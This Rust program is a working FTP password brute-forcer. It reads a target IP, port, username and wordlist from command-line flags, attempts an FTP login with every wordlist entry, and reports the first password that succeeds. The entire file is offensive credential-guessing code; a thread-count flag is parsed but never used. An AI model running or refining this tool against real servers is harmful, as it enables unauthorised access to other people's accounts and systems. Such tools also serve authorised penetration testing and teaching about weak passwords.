use std::{
    env,
    fs::File,
    io::{self, BufRead},
};

use ftp::FtpStream;

struct Config {
    ip: String,
    port: String,
    file: String,
    num_threads: String,
    username: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            ip: String::new(),
            port: String::new(),
            file: String::new(),
            num_threads: String::new(),
            username: String::new(),
        }
    }
}

fn main() {
    let mut config = Config::default();
    let args: Vec<String> = env::args().collect();

    for (index, arg) in args.iter().enumerate() {
        //ip
        if arg == "-ip" && &index + 1 < args.len() {
            config.ip = args[index + 1].clone();
        }

        //port
        if arg == "-p" && &index + 1 < args.len() {
            config.port = args[index + 1].clone();
        }

        // wordlist
        if arg == "-w" && &index + 1 < args.len() {
            config.file = args[index + 1].clone();
        }

        // username
        if arg == "-u" && &index + 1 < args.len() {
            config.username = args[index + 1].clone();
        }

        if arg == "-t" && &index + 1 < args.len() {
            config.num_threads = args[index + 1].clone();
        }
    }
    process_wordlist(config);
}

fn process_wordlist(config: Config) {
    //open the wordlist file
    if let Ok(file) = File::open(config.file) {
        //read file rows
        for line in io::BufReader::new(file).lines() {
            if let Ok(word) = line {
                //handling ftp connection
                match ftp_connect(&config.ip, &config.port, &config.username, &word) {
                    Ok(_) => {
                        println!("[+] SUCCESS: {}", word);
                        std::process::exit(0);
                    }
                    Err(_e) => {
                        println!("[-] FAILED: {}", word);
                    }
                }
            }
        }
    } else {
        print!("ERROR: Error opening wordlist file.")
    }
}
fn ftp_connect(
    ip: &str,
    port: &str,
    username: &str,
    password: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut ftp_stream = FtpStream::connect(&format!("{}:{}", &ip, &port))?;
    let _ = ftp_stream.login(username, password)?;
    let _ = ftp_stream.quit();
    Ok(())
}
